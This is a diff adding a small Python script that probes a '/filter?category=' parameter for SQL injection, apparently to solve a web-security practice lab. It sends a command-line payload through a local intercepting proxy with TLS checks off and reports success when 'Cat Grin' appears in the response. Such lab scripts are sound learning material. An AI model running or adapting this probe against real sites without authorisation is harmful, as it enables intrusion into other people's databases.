@@ -1,0 +1,29 @@
+import requests
+import sys # Helps with system-specific parameters and functions
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# The script when run will pass through the below proxy settings
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+def exploit_sqli(url, payload):
+    uri = '/filter?category='
+    req = requests.get(url + uri + payload, proxies=proxies, verify=False)
+    if "Cat Grin" in req.text:
+        return True
+    else:
+        return False
+
+if __name__ == "__main__":
+    try:
+        url = sys.argv[1].strip()  # Get the URL from command line arguments
+        payload = sys.argv[2].strip()  # Get the payload from command line arguments
+    except IndexError:
+        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
+        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
+        sys.exit(-1)
+    
+    if exploit_sqli(url, payload):
+        print("[+] The site appears to be vulnerable to SQL Injection")
+    else:
+        print("[-] The site does not appear to be vulnerable to SQL Injection.")
